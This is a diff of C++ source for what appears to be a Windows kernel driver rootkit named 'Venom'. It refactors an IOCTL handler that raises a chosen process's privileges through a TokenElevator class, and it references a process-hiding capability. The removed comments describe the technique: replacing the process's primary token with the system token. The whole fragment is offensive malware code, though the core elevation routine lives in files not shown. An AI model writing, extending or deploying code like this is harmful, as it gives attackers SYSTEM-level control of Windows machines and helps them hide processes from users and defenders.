@@ -1,15 +1,11 @@
 #include "IoctlHandlers.h"
-#include "Process.h"
-#include "Token.h"
+#include "lib/Process.h"
 #include "Capabilities/ProcessCapabilities/ProcessHider.h"
 #include "Capabilities/TokenCapabilities/TokenElevator.h"
-#include "TokenHandler.h"
 #include "NetworkHandler.h"
 #include "Venom.h"
 
 NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
-	//PEPROCESS Process;
-	//PACCESS_TOKEN Token;
 	auto status = STATUS_SUCCESS;
 	auto stack = IoGetCurrentIrpStackLocation(Irp);
 
@@ -23,17 +19,8 @@ NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
 	}
 
 	auto process = Process(*pid);
-	auto token = Token(process);
-
-	//status = PsLookupProcessByProcessId(UlongToHandle(*pid), &Process);
-
-	//if (!NT_SUCCESS(status)) {
-	//	Irp->IoStatus.Information = 0;
-	//	return status;
-	//}
-	//Token = PsReferencePrimaryToken(Process); // Get the process primary token.
-	//TokenHandler::ReplaceToken(Process, Token); // Replace the process token with system token.
-	auto tokenElevator = TokenElevator(token);
+	
+	auto tokenElevator = TokenElevator(process);
 	status = tokenElevator.elevate();
 
 	Irp->IoStatus.Information = 0;
